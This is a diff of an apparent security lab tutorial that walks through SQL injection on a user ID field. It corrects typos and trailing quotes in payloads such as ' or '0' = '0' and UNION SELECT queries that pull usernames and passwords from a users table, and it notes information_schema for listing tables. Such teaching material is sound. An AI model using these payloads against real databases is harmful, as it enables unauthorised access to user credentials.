@@ -142,18 +142,18 @@ Good Day!
 ppp' or '0' = '0
 ```
 
-4. SQL statement will retrieve alll users from table so list of users will be displayed
+4. SQL statement will retrieve all users from table so list of users will be displayed
 5. Type the following for the user ID (retrieving more columns)
 ```SQL
 -- Note: Remember to put a space after the '--'!
 -- '--' means to treat the rest of the line as a comment
-ppp' or '0' = '0' union select user_id, user from users -- '
+ppp' or '0' = '0' union select user_id, user from users -- 
 
 ``` 
 
-6. Type the following for the userID (retrieving passwords from the table)
+6. Type the following for the user ID (retrieving passwords from the table)
 ```SQL
-ppp' or '0' = '0' union select user_id, password from users -- '
+ppp' or '0' = '0' union select user_id, password from users -- 
 ```
 
 In MySQL, there is a special database called `information_schema` that contains a table called "tables" that stores all the information about the tables.
